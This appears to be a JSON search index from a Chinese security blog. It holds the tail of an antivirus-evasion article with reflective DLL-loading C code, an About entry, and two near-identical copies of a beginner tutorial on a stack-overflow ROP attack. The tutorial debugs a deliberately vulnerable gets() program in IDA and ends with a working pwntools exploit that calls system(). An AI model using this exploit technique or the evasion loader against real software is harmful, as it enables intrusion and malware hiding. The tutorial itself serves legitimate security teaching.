WORD 的 Type + Offset 构成，每个 Type + Offset 记录了一个要重定位的地址的重定位类型和其相对当前页的首地址的偏移。\n\n先通过偏移定位到第一个基址重定位表。遍历每个重定位表时，先通过偏移定位到当前重定位表中的第一个 Type + Offset，遍历每个 Type + Offset 进行重定位。\nPIMAGE_BASE_RELOCATION pRelocDir = (PIMAGE_BASE_RELOCATION)(realImageBase + relocDirRVA);while (pRelocDir-&gt;SizeOfBlock) &#123;    PWORD pTypeOffset = (PWORD)((DWORD_PTR)pRelocDir + sizeof(IMAGE_BASE_RELOCATION));    int typeOffsetNum = (pRelocDir-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);    while (typeOffsetNum--) &#123;        if (pTypeOffset[typeOffsetNum] &gt;&gt; 12 == IMAGE_REL_BASED_DIR64) &#123;            *(PDWORD_PTR)(realImageBase + pRelocDir-&gt;VirtualAddress + (pTypeOffset[typeOffsetNum] &amp; 0xFFF)) += realImageBase - imageBase;        &#125;    &#125;    pRelocDir = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocDir + pRelocDir-&gt;SizeOfBlock);&#125;\n\n调用入口函数\n最后将 .text 改为可读可执行权限，通过偏移定位到入口函数进行调用。\nDWORD oldProtect;VirtualProtect((PVOID)textAddr, textSize, PAGE_EXECUTE_READ, &amp;oldProtect);((BOOL(*)(...))(realImageBase + pNt-&gt;OptionalHeader.AddressOfEntryPoint))(realImageBase, DLL_PROCESS_ATTACH, 0);","categories":["免杀"],"tags":["技术"]},{"title":"Hacking Blog by Calico ~ 说白话，讲透彻！","url":"/2024/08/15/About/","content":"https://github.com/HackerCalico\n问题区：https://github.com/HackerCalico/HackerCalico.github.io/issues\n\n","categories":["About"]},{"title":"栈溢出 - ROP (一)","url":"/2024/08/15/%E6%A0%88%E6%BA%A2%E5%87%BA%20-%20ROP%20(%E4%B8%80)/","content":"介绍栈溢出是一种允许攻击者向栈中写入过长数据的漏洞。\nROP 是栈溢出的一种利于方式，攻击者对栈空间进行构造进而调用程序已有的指令片段进行攻击。\n下面通过一个例题来进行讲解。\n因为是入门第一篇文章，所以会讲的比较细。遇到不明白的继续往后看就清楚了。\n环境搭建1.Linux x64\n2.IDA (Linux x64)\n在官网下载后运行安装\n./idafree84_linux.runapt-get install libxcb-xinerama0\n\n调试分析题目代码：\n#include &lt;stdio.h&gt;char buf[100];__attribute__((visibility(&quot;default&quot;))) void MySystem() &#123;    system(&quot;&quot;);&#125;void MyGets() &#123;    char str[10];    gets(str);&#125;int main() &#123;    MyGets();&#125;\n\n生成可执行文件：\ngcc pwn.c -o pwn -fno-stack-protector -no-pie -wchmod +x pwn\n\n下载链接：https://github.com/HackerCalico/Blog-Resource/raw/main/%E6%A0%88%E6%BA%A2%E5%87%BA%20-%20ROP%20(%E4%B8%80)\n检查保护机制\n&gt; checksec pwn[*] &#x27;/root/Desktop/PWN/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n未开启 Canary 栈保护，说明不会对向栈写入的数据长度进行检查。\n未开启 PIE 保护，说明加载到内存中的基址是固定的 (0x400000)，可以对变量、函数等地址进行预知。\n使用 IDA 进行静态调试\n通过终端启动 IDA，不要双击快捷方式，否则无法与程序进行控制台交互。\ncd 安装路径./ida64\n\nshift + F7 进入 Segments 窗口。\n\n进入可写的 .bss 段 (存放未初始化的全局变量)，可以看到全局变量 buf 在内存中的绝对地址为 0x601060 (后面会用到)。\n\n到这里你可能会有疑问，如果启动多个未开启 PIE 保护的程序它们的绝对地址不会冲突吗？\n答案是系统会让它们运行在独立的虚拟空间。\n使用 IDA 进行动态调试\n在主函数 F12 设置一个软件断点，F9 运行。\n\n在下方 .text 段内的 0x4005E2 处可以发现 pop r15 &amp; retn (硬编码 41 5F C3)。\n\n我们可以断章取义将 0x4005E3 处的 5F C3 作为以下汇编指令使用 (后面会用到)。\npop rdiretn\n\nF8 单步到 call MyGets，下面开始分析该函数的漏洞。\n进入 MyGets 前，可以发现 call MyGets 下一条指令的地址为 0x400579。\n\nF7 步入 MyGets，再 F8 单步到 call gets\n\ncall 指令使 0x400579 入栈，用于函数结束 retn 返回到 0x400579。\n保护现场使原本的栈底入栈，用于函数结束前恢复现场，栈上升到当前函数自己的栈区域。\n栈顶再次上移，给出了用于存储 v1 的空间，局部变量直接存储在栈上。\n将 v1 的首地址 (RBP - 0x0A) 存储在 RDI，作为函数参数告诉 gets 把数据存储在这里。\n\n\n\n地址\n栈\n栈\n栈\n栈\n\n\n\n0x00007FFFFFFFDDC0\n\n\n\nNothing\n\n\n0x00007FFFFFFFDDC8\n\n\n\nNothing\n\n\n0x00007FFFFFFFDDD0\n\n\n0x00007FFFFFFFDDE0\n0x00007FFFFFFFDDE0\n\n\n0x00007FFFFFFFDDD8\n\n0x400579\n0x400579\n0x400579\n\n\n0x00007FFFFFFFDDE0\nNothing\nNothing\nNothing\nNothing\n\n\n指令\ncall 前\ncall MyGets\n保护现场\n定义 v1 &amp; 构造参数\n\n\n指令\n\n\npush rbp\nsub rsp, 10h\n\n\n指令\n\n\nmov rbp, rsp\nlea rax, [rbp - 0x0A]\n\n\n指令\n\n\n\nmov rdi, rax\n\n\n指令\n\n\n\nmov eax, 0x00\n\n\nF5 查看函数伪代码\n在这里可以直接看到 v1 的首地址为 RBP - 0x0A。\ngets 用于接收用户从控制台输入的数据存储到 v1。\n\nF8 单步调用 gets，输入 9 个 1。再 F8 单步到函数结束。\n可以看到我们输入的 111111111\\0 从 0x00007FFFFFFFDDC6 填满了 v1。\n恢复现场使栈区域回到了下面，这都要归功于栈底存储了之前栈底的地址。\nretn 使栈顶下移回到了调用 call MyGets 前的原位，执行地址来到了 0x400579。\n\n\n\n\n地址\n栈\n栈\n栈\n\n\n\n0x00007FFFFFFFDDC0\n3131000000000000\n3131000000000000\n3131000000000000\n\n\n0x00007FFFFFFFDDC8\n0031313131313131\n0031313131313131\n0031313131313131\n\n\n0x00007FFFFFFFDDD0\n0x00007FFFFFFFDDE0\n0x00007FFFFFFFDDE0\n0x00007FFFFFFFDDE0\n\n\n0x00007FFFFFFFDDD8\n0x400579\n0x400579\n0x400579\n\n\n0x00007FFFFFFFDDE0\nNothing\nNothing\nNothing\n\n\n指令\ncall gets\n恢复现场\nretn\n\n\n指令\n\nleave\n\n\n\nROP 分析经过上面的调试分析，我们可以得到以下结论：\n(1) 函数最终 retn 返回的地址\n就是刚步入函数后，栈顶存储的地址；\n也是栈底上移后，栈底下方 (RBP + 8) 存储的地址；\n也是执行 retn 前栈顶存储的地址。\n(2) v1 的首地址为 RBP - 0x0A。\n(3) 只要向 v1 写入长度 0x0A + 8 + 8 的数据，就可以将 retn 返回劫持到自己想执行的地址。\n\n\n\n正常\n\n劫持\n\n\n\n\n地址\n栈\n地址\n栈\n\n\n0x00007FFFFFFFDDC0\n3131000000000000\n0x00007FFFFFFFDDC0\n3131000000000000\n\n\n0x00007FFFFFFFDDC8\n0031313131313131\n0x00007FFFFFFFDDC8\n3131313131313131\n\n\n0x00007FFFFFFFDDD0\n0x00007FFFFFFFDDE0\n0x00007FFFFFFFDDD0\n3131313131313131\n\n\n0x00007FFFFFFFDDD8\n0x400579\n0x00007FFFFFFFDDD8\n自己想执行的地址\n\n\n0x00007FFFFFFFDDE0\n无关紧要的值\n0x00007FFFFFFFDDE0\n无关紧要的值\n\n\n如果开启了 Canary 栈保护，v1 下方会插入一个随机值，retn 前会检查随机值是否被覆盖。\n构造 ROP 链\n很容易想到可以劫持到 system 来命令执行，所以我们要先劫持到 gets 来接收我们想执行的命令。\n我们要探究 gets、system 被正常调用时寄存器和栈的状态，进而通过栈溢出构造出来。\ngets 和 system 都是只有一个参数的函数。在调用 gets 时，从上面就可以看到接收数据的地址要存储在 RDI。在调用 system 时，要执行的命令的地址要存储在 RDI。\n前面提到的全局变量 buf 的地址为 0x601060，可以用于存储要执行的命令。我们要想办法让 0x601060 出现在 RDI 中，再进入 gets。\n前面提到的 pop rdi &amp; retn 的地址为 0x4005E3，我们只要将栈构造为以下状态，就可以成功调用 gets 和 system，可以认真思考一下。\n\n\n\n地址\n栈\n\n\n\n0x00007FFFFFFFDDC0\n3131000000000000\n\n\n0x00007FFFFFFFDDC8\n3131313131313131\n\n\n0x00007FFFFFFFDDD0\n3131313131313131\n\n\n0x00007FFFFFFFDDD8\n0x4005E3 pop rdi &amp; retn\n\n\n0x00007FFFFFFFDDE0\n0x601060 buf\n\n\n0x00007FFFFFFFDDD8\ngets 地址\n\n\n0x00007FFFFFFFDDD0\n0x4005E3 pop rdi &amp; retn\n\n\n0x00007FFFFFFFDDC8\n0x601060 buf\n\n\n0x00007FFFFFFFDDC0\nsystem 地址\n\n\nROP 链栈的变化：\n\n\n\n地址\n栈\n栈\n栈\n栈\n\n\n\n0x00007FFFFFFFDDD0\n3131313131313131\n3131313131313131\n3131313131313131\n3131313131313131\n\n\n0x00007FFFFFFFDDD8\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\n\n\n0x00007FFFFFFFDDE0\nbuf 地址\nbuf 地址\nbuf 地址\nbuf 地址\n\n\n0x00007FFFFFFFDDD8\ngets 地址\ngets 地址\ngets 地址\ngets 地址\n\n\n0x00007FFFFFFFDDD0\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\n\n\n0x00007FFFFFFFDDC8\nbuf 地址\nbuf 地址\nbuf 地址\nbuf 地址\n\n\n0x00007FFFFFFFDDC0\nsystem 地址\nsystem 地址\nsystem 地址\nsystem 地址\n\n\n指令\nleave\nretn\npop rdi\nretn 进入 gets\n\n\n\n\n\n地址\n栈\n栈\n栈\n\n\n\n0x00007FFFFFFFDDD0\n3131313131313131\n3131313131313131\n3131313131313131\n\n\n0x00007FFFFFFFDDD8\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\n\n\n0x00007FFFFFFFDDE0\nbuf 地址\nbuf 地址\nbuf 地址\n\n\n0x00007FFFFFFFDDD8\ngets 地址\ngets 地址\ngets 地址\n\n\n0x00007FFFFFFFDDD0\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\npop rdi &amp; retn 地址\n\n\n0x00007FFFFFFFDDC8\nbuf 地址\nbuf 地址\nbuf 地址\n\n\n0x00007FFFFFFFDDC0\nsystem 地址\nsystem 地址\nsystem 地址\n\n\n指令\ngets 结尾的 retn\npop rdi\nretn 进入 system\n\n\n编写 EXP\n地址能够预知归功于未开启 PIE 保护。\nfrom pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)buf = 0x601060gets = elf.sym[&#x27;gets&#x27;]system = elf.sym[&#x27;system&#x27;]pop_rdi_retn = 0x4005E3payload = cyclic(0x0A + 8) + p64(pop_rdi_retn) + p64(buf) + p64(gets) + p64(pop_rdi_retn) + p64(buf) + p64(system)io = process(&#x27;./pwn&#x27;)io.sendline(payload) io.sendline(&#x27;whoami&#x27;)io.recv()io.interactive()\n","categories":["PWN 从 0 到 1"],"tags":["技术"]},{"title":"栈溢出 - ROP (一)","url":"/2024/08/19/%E6%A0%88%E6%BA%A2%E5%87%BA%20-%20ROP%20(%E4%B8%80)%20-%20%E5%89%AF%E6%9C%AC/","content":"介绍栈溢出是一种允许攻击者向栈中写入过长数据的漏洞。\nROP 是栈溢出的一种利于方式，攻击者对栈空间进行构造进而调用程序已有的指令片段进行攻击。\n下面通过一个例题来进行讲解。\n因为是入门第一篇文章，所以会讲的比较细。遇到不明白的继续往后看就清楚了。\n环境搭建1.Linux x64\n2.IDA (Linux x64)\n在官网下载后运行安装\n./idafree84_linux.runapt-get install libxcb-xinerama0\n\n调试分析题目代码：\n#include &lt;stdio.h&gt;char buf[100];__attribute__((visibility(&quot;default&quot;))) void MySystem() &#123;    system(&quot;&quot;);&#125;void MyGets() &#123;    char str[10];    gets(str);&#125;int main() &#123;    MyGets();&#125;\n\n生成可执行文件：\ngcc pwn.c -o pwn -fno-stack-protector -no-pie -wchmod +x pwn\n\n下载链接：https://github.com/HackerCalico/Blog-Resource/raw/main/%E6%A0%88%E6%BA%A2%E5%87%BA%20-%20ROP%20(%E4%B8%80)\n检查保护机制\n&gt; checksec pwn[*] &#x27;/root/Desktop/PWN/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n未开启 Canary 栈保护，说明不会对向栈写入的数据长度进行检查。\n未开启 PIE 保护，说明加载到内存中的基址是固定的 (0x400000)，可以对变量、函数等地址进行预知。\n使用 IDA 进行静态调试\n通过终端启动 IDA，不要双击快捷方式，否则无法与程序进行控制台交互。\ncd 安装路径./ida64\n\nshift + F7 进入 Segments 窗口。\n\n进入可写的 .bss 段 (存放未初始化的全局变量)，可以看到全局变量 buf 在内存中的绝对地址为 0x601060 (后面会用到)。\n\n到这里你可能会有疑问，如果启动多个未开启 PIE 保护的程序它们的绝对地址不会冲突吗？\n答案是系统会让它们运行在独立的虚拟空间。\n使用 IDA 进行动态调试\n在主函数 F12 设置一个软件断点，F9 运行。\n\n在下方 .text 段内的 0x4005E2 处可以发现 pop r15 &amp; retn (硬编码 41 5F C3)。\n\n我们可以断章取义将 0x4005E3 处的 5F C3 作为以下汇编指令使用 (后面会用到)。\npop rdiretn\n\nF8 单步到 call MyGets，下面开始分析该函数的漏洞。\n在进入 MyGets 前，我们先观察一下：\ncall MyGets 下一条指令的地址为 0x400579\n\n\n\n\n地址\n栈\n\n\n\n0x00007FFFFFFFDDE0\n无关紧要的值\n\n\n\n\n\n寄存器\n值\n\n\n\nRSP\n0x00007FFFFFFFDDE0\n\n\nRBP\n0x00007FFFFFFFDDE0\n\n\nF7 步入 MyGets\n\ncall 指令使 0x400579 入栈，用于最终回到 call MyGets 下一行。并跳转到 MyGets 函数内。\n\n\n\n地址\n栈\n\n\n\n0x00007FFFFFFFDDD8\n0x400579\n\n\n0x00007FFFFFFFDDE0\n无关紧要的值\n\n\n\n\n\n寄存器\n值\n\n\n\nRSP\n0x00007FFFFFFFDDD8\n\n\nRBP\n0x00007FFFFFFFDDE0\n\n\n函数开头和结尾是保护现场的操作，保证调用函数前后栈顶、栈底不发生变化。\npush rbpmov rbp, rsp......leaveretn\n\n下面我们一点一点分析。\nF8 单步两次\npush rbpmov rbp, rsp\n\n原本的栈底入栈，栈底上移与栈顶平齐，上升到当前函数自己的栈区域。\n当前栈底存储着原本的栈底，而当前栈底下面就是原本的栈顶。\n\n\n\n地址\n栈\n\n\n\n0x00007FFFFFFFDDD0\n0x00007FFFFFFFDDE0\n\n\n0x00007FFFFFFFDDD8\n0x400579\n\n\n0x00007FFFFFFFDDE0\n无关紧要的值\n\n\n\n\n\n寄存器\n值\n\n\n\nRSP\n0x00007FFFFFFFDDD0\n\n\nRBP\n0x00007FFFFFFFDDD0\n\n\nF5 查看函数伪代码\n结束了函数开头的保护现场操作，现在要为 v1 局部变量分配 0x0A 大小的空间了，局部变量直接存储在栈上。\ngets 用于接收用户从控制台输入的数据存储到 v1。\n后面的注释表示 v1 的首地址为 RBP - 0x0A，往下看就知道了。\n\nF8 单步四次\nsub rsp, 10hlea rax, [rbp - 0x0A]mov rdi, raxmov eax, 0x00\n\n栈顶再次上移，给出了用于存储 v1 的空间。\n将 RBP - 0x0A 这个地址存储在 RDI，作为函数参数告诉 gets 把数据存储在这里。\n\n\n\n地址\n栈\n\n\n\n0x00007FFFFFFFDDC0\n无关紧要的值\n\n\n0x00007FFFFFFFDDC8\n无关紧要的值\n\n\n0x00007FFFFFFFDDD0\n0x00007FFFFFFFDDE0\n\n\n0x00007FFFFFFFDDD8\n0x400579\n\n\n0x00007FFFFFFFDDE0\n无关紧要的值\n\n\n\n\n\n寄存器\n值\n\n\n\nRSP\n0x00007FFFFFFFDDC0\n\n\nRBP\n0x00007FFFFFFFDDD0\n\n\nRDI\n0x00007FFFFFFFDDC6\n\n\nF8 单步调用 gets，输入 9 个 1\n可以看到我们输入的 111111111\\0 从 0x00007FFFFFFFDDC6 填满了 v1。\n\n\n\n地址\n栈\n\n\n\n0x00007FFFFFFFDDC0\n3131000000000000\n\n\n0x00007FFFFFFFDDC8\n0031313131313131\n\n\n0x00007FFFFFFFDDD0\n0x00007FFFFFFFDDE0\n\n\n0x00007FFFFFFFDDD8\n0x400579\n\n\n0x00007FFFFFFFDDE0\n无关紧要的值\n\n\n\n\n\n寄存器\n值\n\n\n\nRSP\n0x00007FFFFFFFDDC0\n\n\nRBP\n0x00007FFFFFFFDDD0\n\n\nF8 单步一次\nleave\n\n函数结尾的恢复现场操作，发现栈区域回到了下面，这都要归功于栈底存储了之前栈底的地址。\n\n\n\n地址\n栈\n\n\n\n0x00007FFFFFFFDDC0\n3131000000000000\n\n\n0x00007FFFFFFFDDC8\n0031313131313131\n\n\n0x00007FFFFFFFDDD0\n0x00007FFFFFFFDDE0\n\n\n0x00007FFFFFFFDDD8\n0x400579\n\n\n0x00007FFFFFFFDDE0\n无关紧要的值\n\n\n\n\n\n寄存器\n值\n\n\n\nRSP\n0x00007FFFFFFFDDD8\n\n\nRBP\n0x00007FFFFFFFDDE0\n\n\nF8 单步一次\nretn\n\n发现栈顶下移，栈区域回到了调用 call MyGets 前的原位，并且执行地址来到了 call MyGets 的下一行，这都要归功于栈顶存储了下一行地址。\n\n\n\n\n地址\n栈\n\n\n\n0x00007FFFFFFFDDC0\n3131000000000000\n\n\n0x00007FFFFFFFDDC8\n0031313131313131\n\n\n0x00007FFFFFFFDDD0\n0x00007FFFFFFFDDE0\n\n\n0x00007FFFFFFFDDD8\n0x400579\n\n\n0x00007FFFFFFFDDE0\n无关紧要的值\n\n\n\n\n\n寄存器\n值\n\n\n\nRSP\n0x00007FFFFFFFDDE0\n\n\nRBP\n0x00007FFFFFFFDDE0\n\n\n更直观的观察一下整个流程栈的变化\n\n\n\n地址\n栈\n栈\n栈\n栈\n\n\n\n\n0x00007FFFFFFFDDC0\n\n\n\nNothing\n3131000000000000\n\n\n0x00007FFFFFFFDDC8\n\n\n\nNothing\n0031313131313131\n\n\n0x00007FFFFFFFDDD0\n\n\n0x00007FFFFFFFDDE0\n0x00007FFFFFFFDDE0\n0x00007FFFFFFFDDE0\n\n\n0x00007FFFFFFFDDD8\n\n0x400579\n0x400579\n0x400579\n0x400579\n\n\n0x00007FFFFFFFDDE0\nNothing\nNothing\nNothing\nNothing\nNothing\n\n\n指令\n\ncall MyGets\n保护现场\n定义 v1 &amp; 构造参数\ncall gets\n\n\nROP 分析经过上面的调试分析，我们可以得到以下结论：\n(1) 函数最终 retn 返回的地址\n就是刚步入函数后，栈顶存储的地址；\n也是栈底上移后，栈底下方 (RBP + 8) 存储的地址；\n也是执行 retn 前栈顶存储的地址。\n(2) v1 的首地址为 RBP - 0x0A。\n(3) 只要向 v1 写入长度 0x0A + 8 + 8 的数据，就可以将 retn 返回劫持到自己想执行的地址 (栈底下方 (RBP + 8) 存储的地址)。\n\n\n\n正常\n\n劫持\n\n\n\n\n地址\n栈\n地址\n栈\n\n\n0x00007FFFFFFFDDC0\n3131000000000000\n0x00007FFFFFFFDDC0\n3131000000000000\n\n\n0x00007FFFFFFFDDC8\n0031313131313131\n0x00007FFFFFFFDDC8\n3131313131313131\n\n\n0x00007FFFFFFFDDD0\n0x00007FFFFFFFDDE0\n0x00007FFFFFFFDDD0\n3131313131313131\n\n\n0x00007FFFFFFFDDD8\n0x400579\n0x00007FFFFFFFDDD8\n自己想执行的地址\n\n\n0x00007FFFFFFFDDE0\n无关紧要的值\n0x00007FFFFFFFDDE0\n无关紧要的值\n\n\n如果开启了 Canary 栈保护，v1 下方会插入一个随机值，retn 前会检查随机值是否被覆盖。\n构造 ROP 链\n很容易想到可以劫持到 system 来命令执行，所以我们要先劫持到 gets 来接收我们想执行的命令。\n我们要探究 gets、system 被正常调用时寄存器和栈的状态，进而通过栈溢出构造出来。\ngets 和 system 都是只有一个参数的函数。在调用 gets 时，从上面就可以看到接收数据的地址要存储在 RDI。在调用 system 时，要执行的命令的地址要存储在 RDI。\n前面提到的全局变量 buf 的地址为 0x601060，可以用于存储要执行的命令。我们要想办法让 0x601060 出现在 RDI 中，再进入 gets。\n前面提到的 pop rdi &amp; retn 的地址为 0x4005E3，我们只要将栈构造为以下状态，就可以成功调用 gets 和 system，可以认真思考一下。\n\n\n\n地址\n栈\n\n\n\n0x00007FFFFFFFDDC0\n3131000000000000\n\n\n0x00007FFFFFFFDDC8\n3131313131313131\n\n\n0x00007FFFFFFFDDD0\n3131313131313131\n\n\n0x00007FFFFFFFDDD8\n0x4005E3 pop rdi &amp; retn\n\n\n0x00007FFFFFFFDDE0\n0x601060 buf\n\n\n0x00007FFFFFFFDDD8\ngets 地址\n\n\n0x00007FFFFFFFDDD0\n0x4005E3 pop rdi &amp; retn\n\n\n0x00007FFFFFFFDDC8\n0x601060 buf\n\n\n0x00007FFFFFFFDDC0\nsystem 地址\n\n\nMyGets 函数 retn 返回到 pop RDI，栈顶下移至 0x601060 buf。\npop RDI 将栈顶 buf 地址存入 RDI，栈顶下移至 gets 地址。\nretn 进入 gets (执行 retn 前栈顶存储的地址)，输入命令存储到 buf，栈顶下移至 0x4005E3 pop rdi &amp; retn。\ngets 结束 retn 返回到 pop RDI (刚步入函数后，栈顶存储的地址)，栈顶下移至 0x601060 buf。\npop RDI 使栈顶 buf 地址存入 RDI，栈顶下移至 system 地址。\nretn 进入 system (执行 retn 前栈顶存储的地址)，执行存储在 buf 的命令，栈顶下移。\n编写 EXP\n地址能够预知归功于未开启 PIE 保护。\nfrom pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)buf = 0x601060gets = elf.sym[&#x27;gets&#x27;]system = elf.sym[&#x27;system&#x27;]pop_rdi_retn = 0x4005E3payload = cyclic(0x0A + 8) + p64(pop_rdi_retn) + p64(buf) + p64(gets) + p64(pop_rdi_retn) + p64(buf) + p64(system)io = process(&#x27;./pwn&#x27;)io.sendline(payload) io.sendline(&#x27;whoami&#x27;)io.recv()io.interactive()\n","categories":["PWN 从 0 到 1"],"tags":["技术"]}]